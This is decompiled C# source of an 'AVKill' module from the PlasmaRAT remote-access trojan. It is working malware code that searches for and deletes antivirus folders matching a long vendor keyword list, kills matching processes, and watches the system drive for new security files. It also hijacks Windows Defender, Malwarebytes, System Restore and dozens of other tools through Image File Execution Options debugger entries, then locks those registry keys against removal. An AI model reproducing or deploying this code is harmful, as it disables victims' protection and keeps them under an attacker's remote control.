using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace System_Configuration
{
	// Token: 0x0200000F RID: 15
	[StandardModule]
	internal sealed class AVKill
	{
		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000045 RID: 69 RVA: 0x00002408 File Offset: 0x00000608
		// (set) Token: 0x06000046 RID: 70 RVA: 0x00004E30 File Offset: 0x00003030
		public static FileSystemWatcher ProactiveAVKiller
		{
			get
			{
				return AVKill._ProactiveAVKiller;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				FileSystemEventHandler value2 = new FileSystemEventHandler(AVKill.FileSystemWatcher1_Created);
				if (AVKill._ProactiveAVKiller != null)
				{
					AVKill._ProactiveAVKiller.Created -= value2;
				}
				AVKill._ProactiveAVKiller = value;
				if (AVKill._ProactiveAVKiller != null)
				{
					AVKill._ProactiveAVKiller.Created += value2;
				}
			}
		} = new FileSystemWatcher();

		// Token: 0x06000047 RID: 71 RVA: 0x00004E74 File Offset: 0x00003074
		public static void searchav(string folder)
		{
			try
			{
				string[] array = Strings.Split(AVKill.SearchStrings, " ", -1, CompareMethod.Binary);
				string[] directories = Directory.GetDirectories(folder);
				foreach (string text in directories)
				{
					try
					{
						if (Operators.CompareString(AVKill.searchedfolders, text.ToString(), false) != 0)
						{
							AVKill.searchedfolders = text.ToString();
							text.ToString();
							string text2 = Strings.StrConv(text.ToString(), VbStrConv.Lowercase, 0);
							foreach (string value in array)
							{
								try
								{
									if (text2.Contains(value))
									{
										BotKillers.KillFile(text.ToString());
									}
								}
								catch (Exception ex)
								{
								}
							}
						}
					}
					catch (Exception ex2)
					{
					}
				}
			}
			catch (Exception ex3)
			{
			}
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00004F7C File Offset: 0x0000317C
		public static void CheckFileforAV(string path)
		{
			try
			{
				string[] array = Strings.Split(AVKill.SearchStrings, " ", -1, CompareMethod.Binary);
				string text = Strings.StrConv(path.ToString(), VbStrConv.Lowercase, 0);
				foreach (string value in array)
				{
					try
					{
						if (text.Contains(value))
						{
							BotKillers.KillFile(path.ToString());
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00005010 File Offset: 0x00003210
		public static void ProactiveAVKill()
		{
			try
			{
				AVKill.ProactiveAVKiller.Filter = "*.*";
				AVKill.ProactiveAVKiller.NotifyFilter = NotifyFilters.FileName;
				AVKill.ProactiveAVKiller.Path = Environment.GetEnvironmentVariable("HOMEDRIVE") + "\\";
				AVKill.ProactiveAVKiller.IncludeSubdirectories = true;
				AVKill.ProactiveAVKiller.EnableRaisingEvents = true;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600004A RID: 74 RVA: 0x0000508C File Offset: 0x0000328C
		private static void FileSystemWatcher1_Created(object sender, FileSystemEventArgs e)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				AVKill.CheckFileforAV(e.FullPath);
				IL_14:
				goto IL_6F;
				IL_16:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_30:
				goto IL_64;
				IL_32:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_42:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_32;
			}
			IL_64:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_6F:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00005120 File Offset: 0x00003320
		public static void Start()
		{
			try
			{
				if (!AntiEverything.IsAdmin())
				{
					CheckAV.RunAVAdminMode();
				}
				else
				{
					AVKill.searchav(Environment.GetEnvironmentVariable("PROGRAMDATA"));
					AVKill.ProtectMyFile();
					AVKill.searchav(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
					AVKill.AVProcSearcher();
					AVKill.FuckFileName("rstrui.exe");
					AVKill.FuckFileName("AvastSvc.exe");
					AVKill.FuckFileName("avconfig.exe");
					AVKill.FuckFileName("AvastUI.exe");
					AVKill.FuckFileName("avscan.exe");
					AVKill.FuckFileName("instup.exe");
					AVKill.FuckFileName("mbam.exe");
					AVKill.FuckFileName("mbamgui.exe");
					AVKill.FuckFileName("mbampt.exe");
					AVKill.FuckFileName("mbamscheduler.exe");
					AVKill.FuckFileName("mbamservice.exe");
					AVKill.FuckFileName("hijackthis.exe");
					AVKill.FuckFileName("spybotsd.exe");
					AVKill.FuckFileName("ccuac.exe");
					AVKill.FuckFileName("avcenter.exe");
					AVKill.FuckFileName("avguard.exe");
					AVKill.FuckFileName("avgnt.exe");
					AVKill.FuckFileName("avgui.exe");
					AVKill.FuckFileName("avgcsrvx.exe");
					AVKill.FuckFileName("avgidsagent.exe");
					AVKill.FuckFileName("avgrsx.exe");
					AVKill.FuckFileName("avgwdsvc.exe");
					AVKill.FuckFileName("egui.exe");
					AVKill.FuckFileName("zlclient.exe");
					AVKill.FuckFileName("bdagent.exe");
					AVKill.FuckFileName("keyscrambler.exe");
					AVKill.FuckFileName("avp.exe");
					AVKill.FuckFileName("wireshark.exe");
					AVKill.FuckFileName("ComboFix.exe");
					AVKill.FuckFileName("MSASCui.exe");
					AVKill.FuckFileName("MpCmdRun.exe");
					AVKill.FuckFileName("msseces.exe");
					AVKill.FuckFileName("MsMpEng.exe");
					AVKill.FuckFileName("blindman.exe");
					AVKill.FuckFileName("SDFiles.exe");
					AVKill.FuckFileName("SDMain.exe");
					AVKill.FuckFileName("SDWinSec.exe");
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00005300 File Offset: 0x00003500
		public static void FuckFileName(string input)
		{
			try
			{
				if (input.Contains("\\"))
				{
					string[] array = Strings.Split(input, "\\", -1, CompareMethod.Binary);
					foreach (string text in array)
					{
						if (text.Contains(".exe"))
						{
							input = text;
						}
					}
				}
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", true);
				registryKey.CreateSubKey(input);
				registryKey.Close();
				RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + input, true);
				registryKey2.SetValue("Debugger", "nqij.exe");
				SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
				NTAccount ntaccount = securityIdentifier.Translate(typeof(NTAccount)) as NTAccount;
				string identity = ntaccount.ToString();
				RegistrySecurity registrySecurity = new RegistrySecurity();
				registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.ExecuteKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow));
				registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.SetValue | RegistryRights.CreateSubKey | RegistryRights.Delete | RegistryRights.ChangePermissions | RegistryRights.TakeOwnership, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
				registryKey2.SetAccessControl(registrySecurity);
				registryKey2.Close();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00005428 File Offset: 0x00003628
		public static void ProtectMyFile()
		{
			try
			{
				string runFileAs = PlasmaRAT.RunFileAs;
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", true);
				registryKey.CreateSubKey(runFileAs);
				registryKey.Close();
				RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + runFileAs, true);
				registryKey2.SetValue("DisableExceptionChainValidation", "");
				SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
				NTAccount ntaccount = securityIdentifier.Translate(typeof(NTAccount)) as NTAccount;
				string identity = ntaccount.ToString();
				RegistrySecurity registrySecurity = new RegistrySecurity();
				registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.ExecuteKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow));
				registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.SetValue | RegistryRights.CreateSubKey | RegistryRights.Delete | RegistryRights.ChangePermissions | RegistryRights.TakeOwnership, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
				registryKey2.SetAccessControl(registrySecurity);
				registryKey2.Close();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00005508 File Offset: 0x00003708
		public static bool CheckProcess(string location)
		{
			bool result;
			try
			{
				string[] array = Strings.Split(AVKill.SearchStrings, " ", -1, CompareMethod.Binary);
				string text = Strings.StrConv(location.ToString(), VbStrConv.Lowercase, 0);
				foreach (string value in array)
				{
					try
					{
						if (text.Contains(value))
						{
							AVKill.FuckFileName(location.ToString());
							BotKillers.KillFile(location.ToString());
							result = true;
							break;
						}
					}
					catch (Exception ex)
					{
					}
				}
			}
			catch (Exception ex2)
			{
			}
			return result;
		}

		// Token: 0x0600004F RID: 79 RVA: 0x000055B0 File Offset: 0x000037B0
		public static void AVProcSearcher()
		{
			try
			{
				string value = "Program Files";
				try
				{
					foreach (object obj in ((IEnumerable)NewLateBinding.LateGet(Interaction.GetObject("winmgmts:", null), null, "ExecQuery", new object[]
					{
						"Select * from Win32_Process"
					}, null, null, null)))
					{
						object objectValue = RuntimeHelpers.GetObjectValue(obj);
						if ((NewLateBinding.LateGet(objectValue, null, "ExecutablePath", new object[0], null, null, null).ToString().Contains(value) | NewLateBinding.LateGet(objectValue, null, "ExecutablePath", new object[0], null, null, null).ToString().Contains("ProgramData")) && !NewLateBinding.LateGet(objectValue, null, "executablepath", new object[0], null, null, null).ToString().Contains(PlasmaRAT.InstallationOfEverything) && Operators.CompareString(NewLateBinding.LateGet(objectValue, null, "executablepath", new object[0], null, null, null).ToString(), Application.ExecutablePath, false) != 0)
						{
							try
							{
								try
								{
									if (AVKill.CheckProcess(Conversions.ToString(NewLateBinding.LateGet(objectValue, null, "ExecutablePath", new object[0], null, null, null))))
									{
										Process.GetProcessById(Conversions.ToInteger(NewLateBinding.LateGet(objectValue, null, "ProcessID", new object[0], null, null, null))).Kill();
									}
								}
								catch (Exception ex)
								{
								}
							}
							catch (Exception ex2)
							{
							}
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception ex3)
			{
			}
		}

		// Token: 0x0400004A RID: 74
		[AccessedThroughProperty("ProactiveAVKiller")]
		private static FileSystemWatcher _ProactiveAVKiller;

		// Token: 0x0400004B RID: 75
		public static string searchedfolders;

		// Token: 0x0400004C RID: 76
		private static string lol = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\";

		// Token: 0x0400004D RID: 77
		private static string SearchStrings = "arcavir avast avg avira bkav bullguard emsisoft anti-malware eset nod32 f-prot f-secure gdata ikarus k7 kaspersky lavasoft adaware malwarebytes mcafee security norman norton outpost panda firewall antivirus antimalware antispyware anti-spyware rising sophos trend vipre webroot defender zomealarm comodo agnitum ahnlab antiy bytehero quickheal clamav commtouch drweb fortinet jiangmin kingsoft microworld nano nprotect pctools symantec thehacker totaldefense trendmicro vba32 checkpoint tuneup spybot iobit keyscrambler zoner vipre virusbuster virus nano immunet antivirus solo escan combofix hijackthis onlinescanner roguekiller spybot blacksheep";
	}
}
